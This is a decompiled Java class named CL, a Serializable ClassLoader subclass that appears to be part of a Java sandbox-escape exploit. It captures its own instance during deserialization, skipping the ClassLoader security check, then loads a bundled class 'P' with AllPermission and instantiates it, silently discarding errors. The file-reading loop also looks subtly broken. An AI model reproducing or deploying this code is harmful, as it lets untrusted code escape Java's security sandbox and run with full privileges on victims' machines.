import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.cert.Certificate;
import java.net.URL;
import java.io.ByteArrayOutputStream;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

// 
// Decompiled by Procyon v0.5.30
// 

public class CL extends ClassLoader implements Serializable
{
    private static final long serialVersionUID = 7245609214256455522L;
    public static CL instance;
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        objectOutputStream.defaultWriteObject();
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        CL.instance = this;
        objectInputStream.defaultReadObject();
    }
    
    public void boo() {
        try {
            final Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[8192];
            int read;
            while ((read = this.getClass().getResourceAsStream("P.class").read(array)) > 0) {
                byteArrayOutputStream.write(array, 0, read);
            }
            final byte[] byteArray = byteArrayOutputStream.toByteArray();
            final Class<?> defineClass = super.defineClass("P", byteArray, 0, byteArray.length, new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions));
            if (defineClass == null) {
                return;
            }
            defineClass.newInstance();
        }
        catch (Exception ex) {}
    }
    
    static {
        CL.instance = null;
    }
}
